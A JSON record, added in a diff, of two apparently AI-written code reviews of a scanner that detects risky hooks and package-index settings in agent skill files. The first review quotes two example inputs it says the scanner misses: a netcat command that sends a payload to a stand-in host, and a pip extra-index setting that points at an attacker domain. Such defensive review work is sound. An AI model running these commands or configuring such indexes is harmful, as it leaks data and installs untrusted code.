@@ -1,0 +1,44 @@
+{
+  "review_schema": 2,
+  "success": true,
+  "provider": "codex",
+  "degraded": false,
+  "reviews_succeeded": 2,
+  "reviews_expected": 2,
+  "reviewed": true,
+  "reviews": {
+    "openai": {
+      "feedback": "- Category: bug\n- Severity: medium\n- File: plugins/shipwright-security/scripts/tools/skill_surface_hooks.py:34\n- Finding: Standard hostname targets for netcat are missed. For example, `nc collector.example 4444 < payload.json` matches `_REMOTE_TOOL` but not `_REMOTE_TARGET`, so a hook sending data off-machine produces no `SURFACE_HOOK_REMOTE_SINK` finding.\n- Suggestion: Recognize hostname arguments for the supported network commands, including their usual space-separated host/port syntax. Add a regression test using this command.\n\n- Category: bug\n- Severity: medium\n- File: plugins/shipwright-security/scripts/tools/skill_surface_registry.py:43\n- Finding: `_foreign_host` checks only the first URL. Pip accepts multiple whitespace-separated extra indexes, so `extra-index-url = https://pypi.org/simple https://attacker.example/simple` returns no finding because the first host is exempt, even though installation also trusts the attacker\u2019s index.\n- Suggestion: Inspect every configured index URL and report each non-default destination. Add a test with a default index followed by a foreign index.\n\nThe implementation covers the main acceptance scenarios, but these ordinary configuration forms evade the intended checks. Ship with fixes for these detection gaps.\n\nSHIPWRIGHT_VERDICT: revise",
+      "via": "codex",
+      "status": "success"
+    },
+    "glm": {
+      "feedback": "## Review\n\nI read the diff against the spec's ACs and hunted for correctness, security, test-quality, and regression issues.\n\n**Spec compliance:** All six rule families are implemented with the required ids; the clamp-to-`high` advisory contract is implemented (`_clamp`, `MAX_SEVERITY = \"high\"`) and tested; the marker-suppression policy (documentation only, not `SKILL.md`/agent dirs/JSON/registry) is implemented in `_marker_honoured` and tested; failure isolation (rule crash \u2192 stderr log, findings preserved) is implemented and tested both at `scan_file` and `main` level; the tree-walk/CLI-exit assertion is tested in `test_skill_surface_wiring.py`. The refactor of the dependency scanner into `prompt_scan_dependencies.py` is verbatim with thin wrappers \u2014 good.\n\n**Findings (all minor):**\n\n- Category: edge-case | Severity: low | `skill_surface_hooks.py` (`_target_is_remote`)\n  A `host:path` token that is not a URL is treated as remote unless it starts with `127.`/`0.0.0.0`; loopback is only exempted for the literal `127.x`/`0.0.0.0` prefixes and URL-parsed hosts. IPv6 loopback (`::1`, `[::1]:9000`) in a `nc`/`scp`-style target is not matched by `_REMOTE_TARGET` at all (miss), and an internal hostname like `build.lan:8080` is flagged (advisory FP, acknowledged in the guide). Suggestion: also exempt `localhost:`-prefixed tokens; acceptable as-is given advisory severity.\n\n- Category: edge-case | Severity: low | `skill_surface_prose.py` (`_scan_padding`)\n  A blank-line run at end-of-file (\u226525 blank lines, nothing after) is never emitted because the flush only happens when a non-blank line follows. That's arguably correct (nothing is hidden), but a padding attack that appends the payload in a *later* trailing-whitespace-only context after CRLF tricks is not covered. No change required; noting the boundary.\n\n- Category: test | Severity: low | `test_skill_surface_prose.py` (`test_allowlist_marker_does_not_silence_agent_config`)\n  The test asserts the phrase is flagged, but doesn't assert that the *marker itself* is what fails to suppress (no paired positive control where the same content in `docs/` is clean \u2014 that pairing exists in `test_allowlist_marker_skips_documentation`, so combined coverage is fine, but the parametrization would pass even if the marker were honored for `plugins/p/agents/` specifically). Very low risk.\n\n- Category: spec | Severity: low | measured full-repo probe\n  The spec calls for a *recorded* probe (\"running the scanner over this repository itself yields zero `SURFACE_*` findings\"). No record of that run (output file, evidence path) appears in the diff. The tests cover synthetic trees only. Suggestion: attach the full-repo scan output to the run's evidence.\n\n- Category: regression | Severity: low | `prompt_injection_scan.py` `scan_file` signature\n  `scan_file` was reshaped into a wrapper over `_scan_file_by_type`. The diff truncates the old parameter list at three visible params; if any external caller passed a fourth positional argument (e.g. an allowlist flag) it would now silently shift. The wrappers for `scan_dependency_file`/`extract_dependency_names` preserve the public names, which mitigates the main risk.\n\n**Things I checked and found sound:** the `MZ`-prose false-positive guard; the linear-time space-run scan (no catastrophic backtracking, with a timing test); the fence/inline-code blanking; the BOM handling (`utf-8-sig`) for frontmatter; the TOML section-scoping (`url` only inside index tables, `uv`/`pip` sections only in `pyproject.toml`); the escaped-Windows-command line-number lookup; the crash-isolation tests (including that already-emitted findings survive a later rule exception); the \"concealed binary + early return on unreadable text\" ordering; and no secrets/injection sinks introduced (all input is read locally, regex-based, no `eval`/shell execution).\n\nOverall: a careful, well-tested implementation with only advisory-severity rough edges. Ship-as-is; the low findings can be handled in follow-up.\n\nSHIPWRIGHT_VERDICT: approve",
+      "via": "openrouter",
+      "status": "success"
+    }
+  },
+  "missing_legs": [],
+  "driver": "claude",
+  "driver_requested": "claude",
+  "codextender_active": false,
+  "mode": "code",
+  "capture": {
+    "run_id": "iterate-2026-11-20-skill-surface-scan-rules",
+    "at": "2026-11-20T13:53:51.382453+00:00"
+  },
+  "verdicts": {
+    "openai": "revise",
+    "glm": "approve"
+  },
+  "statuses": {
+    "openai": "success",
+    "glm": "success"
+  },
+  "contradiction": {
+    "detected": false,
+    "comparable": true,
+    "requires_resolution": false,
+    "reason": "verdicts agree within one step: glm=approve, openai=revise"
+  }
+}
